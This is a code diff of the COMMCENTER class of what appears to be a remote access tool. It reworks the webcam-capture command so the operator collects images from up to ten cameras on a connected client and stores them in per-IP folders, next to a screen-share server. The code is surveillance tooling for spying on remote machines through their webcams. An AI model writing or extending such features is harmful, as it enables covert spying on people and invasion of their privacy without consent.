@@ -535,40 +535,38 @@ class COMMCENTER:
         ScreenShareServer().start_server()
 
     def c_webcam_capture(self):
-        if not self.CURRENT:
-            pull.error("You need to connect before executing this command!")
+        from mods.webcam import Webcam
+        webcam = Webcam(max_devices=10)  
+
+        results = webcam.capture_all()
+
+        if not webcam.SUCCESS:
+            print("No webcam images captured.")
             return
 
-        def recv_wrapper(q):
+        base_dir = "webcam"
+        client_ip = webcam.client_info.ip
 
-            try:
-                data = self.CURRENT[1].recv_data()
-                q.put(data)
-            except Exception as e:
-                q.put(e)
+        if not os.path.isdir(base_dir):
+            os.mkdir(base_dir)
 
-            self.CURRENT[1].send_data("webcam:")
-            q = queue.Queue()
-            t = threading.Thread(target=recv_wrapper, args=(q,))
-            t.start()
-            t.join(timeout=7) 
-            if t.is_alive():
-                pull.error("Webcam error: No response within 7 seconds")
-                return
+        ip_dir = os.path.join(base_dir, client_ip)
+        if not os.path.isdir(ip_dir):
+            os.mkdir(ip_dir)
 
-            result = q.get()
+        for index, data in results.items():
+            timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
+            filename = f"webcam_{index}_{timestamp}.png"
+            fullpath = os.path.join(ip_dir, filename)
 
-            if isinstance(result, bytes):
-                dirname = os.path.dirname(__file__)
-                dirname = os.path.join(dirname, 'webcam')
-                if not os.path.isdir(dirname):
-                    os.mkdir(dirname)
-                fullpath = os.path.join(dirname, datetime.now().strftime("%d-%m-%Y_%H-%M-%S.png"))
-                with open(fullpath, 'wb') as fl:
-                    fl.write(result)
-                pull.print("Webcam image saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
+            with open(fullpath, "wb") as f:
+                f.write(data)
+            if pull:
+                pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
             else:
-                pull.error(f"Webcam error: {result}")
+                print(f"[✓] Saved image from camera {index}: {fullpath}")
+
+
 
     def c_exit(self):
         sys.stdout.write("\n")
